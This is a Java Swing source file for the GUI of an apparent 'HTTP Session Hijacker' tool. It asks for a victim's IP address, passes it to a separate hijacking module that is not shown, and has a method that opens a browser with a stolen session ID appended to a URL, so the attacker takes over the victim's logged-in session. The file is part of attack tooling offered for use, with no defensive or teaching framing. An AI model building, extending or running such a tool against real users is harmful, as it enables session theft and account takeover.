import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowEvent;
import java.awt.event.WindowListener;
import java.net.*;

public class GUI extends Frame implements WindowListener, ActionListener {
    private JPanel p1;
    private JLabel victimIPLabel;
    private JTextField victimIPTextField;
    private JLabel searchTimeoutLabel;
    private JComboBox<Integer> searchTimeoutChoice;
    private JButton hijackButton;
    private JProgressBar searchProgressBar;
    private JLabel timeoutReachedLabel;

    public GUI() {
        setLayout(new GridBagLayout());
        p1 = new JPanel();
        victimIPLabel = new JLabel("Victim's IP:");
        victimIPTextField = new JTextField(12);
        searchTimeoutLabel = new JLabel("Search Timeout(s):");
        searchTimeoutChoice = new JComboBox<>(new Integer[]{10, 20, 30, 40, 50, 60});
        hijackButton = new JButton("Search For Hijackable Session");
        searchProgressBar = new JProgressBar();
        searchProgressBar.setVisible(false);
        timeoutReachedLabel = new JLabel("Timeout reached! No vulnerable session found.");
        timeoutReachedLabel.setVisible(false);

        p1.add(victimIPLabel);
        p1.add(victimIPTextField);
        p1.add(searchTimeoutLabel);
        p1.add(searchTimeoutChoice);
        hijackButton.addActionListener(this);
        p1.add(hijackButton);

        GridBagConstraints c = new GridBagConstraints();

        c.insets = new Insets(15,5,15,5);
        c.gridx = 0;
        c.gridy = 0;
        add(p1, c);
        c.gridx = 0;
        c.gridy = 1;
        add(searchProgressBar, c);
        add(timeoutReachedLabel, c);

        addWindowListener(this);

        setTitle("HTTP Session Hijacker");
        setSize(800, 500);
        setLocationRelativeTo(null);
        setVisible(true);
    }

    public void timeoutReached() {
        searchProgressBar.setVisible(false);
        timeoutReachedLabel.setVisible(true);
    }

    public void openBrowserWithStolenSessionID(String url, String cookieName, String sID) {
        searchProgressBar.setVisible(false);
        try {
            if (Desktop.isDesktopSupported() && Desktop.getDesktop().isSupported(Desktop.Action.BROWSE)) {
                Desktop.getDesktop().browse(new URI(url + "?" + cookieName + "=" + sID));
            }
        } catch (Exception e) {
            System.out.println(e.getMessage());
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws Exception {
        GUI gui = new GUI();
    }

    @Override
    public void windowOpened(WindowEvent windowEvent) {

    }

    @Override
    public void windowClosing(WindowEvent windowEvent) {
        dispose();
    }

    @Override
    public void windowClosed(WindowEvent windowEvent) {

    }

    @Override
    public void windowIconified(WindowEvent windowEvent) {

    }

    @Override
    public void windowDeiconified(WindowEvent windowEvent) {

    }

    @Override
    public void windowActivated(WindowEvent windowEvent) {

    }

    @Override
    public void windowDeactivated(WindowEvent windowEvent) {

    }

    @Override
    public void actionPerformed(ActionEvent actionEvent) {
        timeoutReachedLabel.setVisible(false);
        searchProgressBar.setIndeterminate(true);
        searchProgressBar.setVisible(true);
        // Send relevant data to the hijacker module
        String victimIPString = victimIPTextField.getText();
        Integer chosenTimeout = (Integer) searchTimeoutChoice.getSelectedItem();
        String[] ans = HTTPHijack.Hijacker(victimIPString, chosenTimeout);

        System.out.println(ans[0]);
        System.out.println(ans[1]);
    }
}
